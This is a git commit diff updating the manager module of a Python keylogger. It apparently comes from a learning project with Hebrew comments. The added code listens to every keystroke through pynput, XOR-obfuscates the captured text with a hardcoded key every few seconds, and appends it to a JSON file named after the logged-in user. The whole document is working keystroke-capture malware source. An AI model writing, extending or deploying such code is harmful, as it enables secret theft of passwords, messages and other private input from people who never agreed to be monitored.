ee3fbe98f62cc3d49ea0652e4dd7a034888c4c7d
jacobsun211 <jacobsun211@gmail.com>
2025-09-04 13:44:51 +0300

    Update manager.py 1.5

--- agent/manager.py
+++ agent/manager.py
@@ -4,6 +4,7 @@ from datetime import datetime
 import json
 import os
 from flask import jsonify
+import time
 
 
 
@@ -28,53 +29,72 @@ class IKeylogger:
                 tempKey = str(key)
         self.my_list.append(tempKey)
 
+
     def start_logging(self):
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.listener.start()
 
+    def stop_logging(self):
+        self.listener.stop()
 
-class AddToFile(IKeylogger):
-    def __init__(self):
-        super().__init__()
-        self.timestamps = []
-        threading.Timer(5, self.print_json).start()
-
-
-    def print_json(self,count=False,filename="data.txt"):
-        combined_keys = "".join(self.my_list)# join list, not str(list)
-
-        self.timestamps=(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-        data = combined_keys + "\n" + self.timestamps
-        if not os.path.exists(filename):
-            mode = "w"
-        else:
-            mode = "a"
-        if combined_keys:
-            with open(filename, mode) as f:
-                f.write(data+"\n")
+    def get_logged_keys(self):
+        keys = "".join(self.my_list)
         self.my_list = []
-        self.timestamps = []
-        if not count:
-            threading.Timer(5, self.print_json).start()
+        return keys
 
+
+
+class AddToFile():
+    def __init__(self):
+        self.timestamps = []
+
+    def create_file(self, combined_keys):
+        if not combined_keys:
+            return
+
+        filename = os.getlogin() + ".json"
+        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+        entry = {timestamp: combined_keys}
+
+        if os.path.exists(filename):
+            with open(filename, "r") as f:
+                try:
+                    data = json.load(f)
+                except json.JSONDecodeError:
+                    data = {}
+        else:
+            # אם אין קובץ – ניצור אותו ריק
+            data = {}
+            with open(filename, "w") as f:
+                json.dump(data, f)
+
+        data.update(entry)
+
+        with open(filename, "w") as f:
+            json.dump(data, f)
 
 
     def xor_encrypt(self, text, key):
         return ''.join(f"{ord(c) ^ ord(key[i % len(key)]):02x}"
                        for i, c in enumerate(text))
 
-    def xor_decrypt(self, enc_hex, key):
-        return ''.join(chr(int(enc_hex[i:i + 2], 16) ^ ord(key[(i // 2) % len(key)]))
-                       for i in range(0, len(enc_hex), 2))
-
-
 class Manager:
     def __init__(self):
-        self.keylogger = AddToFile()
+        self.keylogger = IKeylogger()
+        self.add = AddToFile()
 
     def run(self):
         self.keylogger.start_logging()
-        self.keylogger.print_json(True,"data.txt")
+        while True:
+            time.sleep(3)
+            keys = self.keylogger.get_logged_keys()
+            data = self.add.xor_encrypt(keys,"01234567891")
+            self.add.create_file(data)
+            print(data)
+            if keys == "Key.ctrl_l": # ctrl+c עוצר את התוכנה אחרי שהוקלד
+                self.keylogger.stop_logging()
+                break
+
 
 
 
